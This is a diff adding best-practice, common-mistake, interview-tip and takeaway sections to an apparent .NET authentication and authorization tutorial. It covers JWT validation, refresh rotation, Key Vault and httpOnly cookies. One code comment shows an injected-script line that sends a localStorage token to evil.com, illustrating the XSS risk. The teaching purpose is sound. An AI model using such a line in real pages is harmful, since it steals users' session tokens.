@@ -92,6 +92,81 @@ public byte[] Encrypt(byte[] plaintext, byte[] key)
 // Use: Azure Key Vault, AWS KMS, HashiCorp Vault
 // Rotate keys periodically (Key Vault supports auto-rotation)`,
             language: 'csharp'
+        },
+        {
+            title: 'Best Practices',
+            content: `<p>Security is defense-in-depth. Follow these practices to protect authentication and authorization flows:</p>
+            <ul>
+                <li><strong>Short-lived access tokens (5–15 min)</strong> — limits the window of a stolen token. Pair with refresh tokens for session continuity.</li>
+                <li><strong>Refresh token rotation</strong> — issue a new refresh token on every use and invalidate the old one. Detect reuse as a compromise signal and revoke the family.</li>
+                <li><strong>Store secrets in Key Vault / KMS</strong> — never in code, config files, or environment variables on shared machines. Use managed identity to access the vault.</li>
+                <li><strong>Use HTTPS everywhere</strong> — enforce HSTS, redirect HTTP to HTTPS, use TLS 1.2+ minimum. No exceptions, even for internal services (use mTLS).</li>
+                <li><strong>Validate all JWT claims on every request</strong> — issuer, audience, expiry, not-before, and algorithm. Pin allowed algorithms; reject <code>alg: none</code>.</li>
+                <li><strong>Implement token revocation</strong> — short-lived tokens reduce the need, but for high-assurance operations maintain a deny-list or use reference tokens with introspection.</li>
+            </ul>`,
+            code: `// Short-lived access token + refresh rotation
+services.AddAuthentication().AddJwtBearer(options => {
+    options.TokenValidationParameters = new TokenValidationParameters {
+        ValidateIssuer = true,
+        ValidateAudience = true,
+        ValidateLifetime = true,
+        ClockSkew = TimeSpan.FromSeconds(30), // tighten from 5-min default
+        ValidAlgorithms = new[] { "RS256" }   // pin algorithm
+    };
+});
+
+// Store secrets in Azure Key Vault with managed identity
+builder.Configuration.AddAzureKeyVault(
+    new Uri("https://my-vault.vault.azure.net/"),
+    new DefaultAzureCredential());
+
+// Never do this:
+// var secret = "hardcoded-signing-key"; // committed to source control!`,
+            language: 'csharp'
+        },
+        {
+            title: 'Common Mistakes',
+            content: `<p>These errors create real security vulnerabilities — many are subtle and pass code review if reviewers aren't security-aware:</p>
+            <ul>
+                <li><strong>Storing JWT in localStorage</strong> — accessible to any JavaScript on the page. A single XSS vulnerability exfiltrates all tokens. Use httpOnly cookies or a BFF pattern instead.</li>
+                <li><strong>Not validating token audience/issuer</strong> — a valid token minted for a different API or issuer is accepted, allowing cross-service token replay attacks.</li>
+                <li><strong>Long-lived tokens without refresh</strong> — a 30-day access token that cannot be revoked gives an attacker a month of access from a single theft.</li>
+                <li><strong>Shared signing keys across environments</strong> — a token minted in dev/staging works in production. Use per-environment keys and validate issuer strictly.</li>
+                <li><strong>No token revocation mechanism</strong> — when a user changes password or an admin deactivates an account, existing tokens continue to work until natural expiry.</li>
+            </ul>`,
+            code: `// WRONG: JWT in localStorage (XSS can steal it)
+localStorage.setItem('token', response.accessToken);
+// Any injected script: fetch('https://evil.com?t=' + localStorage.getItem('token'))
+
+// BETTER: httpOnly secure cookie (not accessible to JS)
+services.AddAuthentication().AddCookie(options => {
+    options.Cookie.HttpOnly = true;
+    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
+    options.Cookie.SameSite = SameSiteMode.Strict;
+});
+
+// WRONG: Same signing key in dev and production
+// A token generated with: dotnet user-jwts create --scope admin
+// would be accepted by production if keys match!
+
+// RIGHT: Per-environment keys, strict issuer validation
+ValidIssuer = "https://auth.production.example.com" // rejects dev tokens`,
+            language: 'csharp'
+        },
+        {
+            title: 'Interview Tips',
+            content: '<p>Security interviews test depth of understanding, not just "use JWT."</p>',
+            callout: { type: 'tip', title: 'What Interviewers Look For', text: 'Know the full OAuth 2.0 Authorization Code + PKCE flow end-to-end. Explain token vs session trade-offs clearly: tokens are stateless (scalable, but hard to revoke) vs sessions are stateful (easy to revoke, but require server storage). Describe refresh token rotation and WHY it matters — reuse detection as a compromise signal. Understand that JWT claims (iss, aud, exp) must ALL be validated, not just the signature. Distinguish authentication (who you are) from authorization (what you can do) — conflating them is the most common interview mistake.' }
+        },
+        {
+            title: 'Key Takeaways',
+            content: `<ul>
+                <li><strong>Authentication = who you are; Authorization = what you can do</strong> — they are separate concerns that must be addressed independently.</li>
+                <li><strong>JWT is stateless (pros and cons)</strong> — scales horizontally without session stores, but cannot be revoked before expiry without additional infrastructure.</li>
+                <li><strong>Always validate tokens server-side</strong> — check signature, issuer, audience, expiry, and algorithm on every request. Client-side checks are insufficient.</li>
+                <li><strong>Defense in depth</strong> — no single control is sufficient. Layer: strong hashing, short-lived tokens, refresh rotation, MFA, rate limiting, anomaly detection.</li>
+                <li><strong>Secrets belong in vaults, not code</strong> — use Azure Key Vault, AWS KMS, or HashiCorp Vault with managed identity. Rotate keys regularly.</li>
+            </ul>`
         }
     ],
     questions: [
